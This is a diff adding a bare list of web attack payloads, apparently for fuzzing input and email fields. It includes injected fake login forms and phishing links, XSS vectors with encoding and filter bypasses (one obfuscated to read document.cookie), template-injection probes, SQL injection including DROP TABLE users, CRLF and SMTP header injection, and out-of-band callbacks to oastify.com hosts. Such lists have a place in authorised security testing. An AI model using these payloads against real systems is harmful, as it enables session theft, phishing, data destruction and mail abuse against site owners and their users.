@@ -1,0 +1,32 @@
+"><p><h1>Malicious Login form.</h1></p><p><input name="login" type="text"/><h1>Please enter login</h1></p><p><input name="pass" type="text"/><h1>Please enter pass</h1></p>
+javascript:prompt("Hello!Enter+your+password")
+<a href=http://attackers.com></a> 
+"><script>confirm(123)</script>
+%22%3e%3cscript%3econfirm(123)%3c%2fscript%3e
+&#x22;&#x3e;&#x3c;script&#x3e;confirm(123)&#x3c;&#x2f;script&#x3e;
+"><a href=https://google.com><font size=150 color=red>Click for Coupon</font></a>
+"/><a href=https://google.com><font size=150 color=red>Click for Coupon</font></a> 
+"<script>alert(1)</script>"@example.com
+<a href='mailto:USER_EMAIL'>email me</a>
+foo'onclick='alert'foo='@example.com
+<IMG SRC="https://www.netcracker.com/assets/templates/v.3.0/favicon/favicon-72.png">
+<IMG SRC="https://547a1m06a5yq1xagxkgcu1lllcr2fr.oastify.com">
+547a1m06a5yq1xagxkgcu1lllcr2fr.oastify.com
+<p>123<embed src=\"data:text/htmlbase64,PHNjcmlwdD5hbGVydCgiWFNTIik8L3NjcmlwdD4=\"></p>
+"><img src=x onerror=confirm()>
+<h1>HELLO</h1>
+12345-abc-1-23456<scr<script>ipt>alert(document.cookie)<%2Fscr<script>ipt>.img
+"><BODy onbeforescriptexecute="x1='cookie';c=')';b='a';location='jav'+b+'script:con'+'fir\u006d('+'document'+'.'+x1+c">
+
+email
+test+(<script>alert(0)</script>)@example.com
+test@example(<script>alert(0)</script>).com
+"<script>alert(0)</script>"@example.com
+"<%= 7 * 7 %>"@example.com
+test+(${{7*7}})@example.com
+"' OR 1=1 -- '"@example.com
+"mail'); DROP TABLE users;--"@example.com
+john.doe@tc91pnaws0y3zyo79u4wuzzib9hz5o.oastify.com
+victim&email=attacker@example.com
+"%0d%0aContent-Length:%200%0d%0a%0d%0a"@example.com
+"recipient@test.com>\r\nRCPT TO:<victim+"@test.com
